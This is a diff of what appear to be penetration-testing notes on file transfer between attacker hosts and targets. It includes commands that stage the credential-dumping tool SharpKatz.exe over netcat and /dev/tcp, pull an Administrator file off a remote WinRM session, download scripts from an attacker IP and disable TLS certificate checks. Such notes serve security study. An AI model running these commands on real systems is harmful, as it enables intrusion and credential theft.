@@ -4,25 +4,21 @@ tags:
   - "#pseudo-networks"
 ---
 # Python Server:
-- Linux
 ```shell-session
 $ python3 -m http.server [<PORT>]
 $ python2.7 -m SimpleHTTPServer
 ```
 # SMB Server:
-- Linux:
 ```shell-session
 $ sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
 $ sudo impacket-smbserver -smb2support share $(pwd) -user '' -password ''
 ```
 
 # LDAP Server
-- Linux
 ```shell-session
 $ java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
 ```
 # FTP Server
-- Linux
 ```shell-session
 $ python3 -m pyftpdlib -w
 ```
@@ -36,6 +32,7 @@ $ ruby -run -ehttpd . -p8000
 ```
 
 # Windows Client
+## Net
 - SMB
 ```powershell
 > net use n: \\IP\shareName /user:test password
@@ -92,6 +89,16 @@ PS > (New-Object Net.WebClient).DownloadString('https://<IP>[:PORT]/path-to/scri
 # "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
 PS > [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
+## WinRM
+```powershell
+PS > Test-NetConnection -ComputerName DATABASE01 -Port 5985
+PS > $Session = New-PSSession -ComputerName DATABASE01
+
+Upload to Session
+PS > Copy-Item -Path "Path\to\file" -ToSession $Session -Destination "Path\to\save"
+
+PS > Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -FromSession $Session -Destination "C:\" 
+```
 ## New-PSDrive
 ```powershell
 > New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
@@ -131,6 +138,19 @@ end with
 # Linux Client
 ## cURL
 ## Wget
+## Netcat
+On Linux:
+```shell-session
+$ ncat -l -p <PORT> --recv-only > SharpKatz.exe
+```
+From Kali:
+```shell-session
+$ nc --send-only 0 <IP> <PORT> < SharpKatz.exe
+```
+## /dev/tcp
+```shell-session
+$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
 ## Python
 ```shell-session
 $ python2.7 -c 'import urllib;urllib.urlretrieve ("https://address.to/file", "file")'
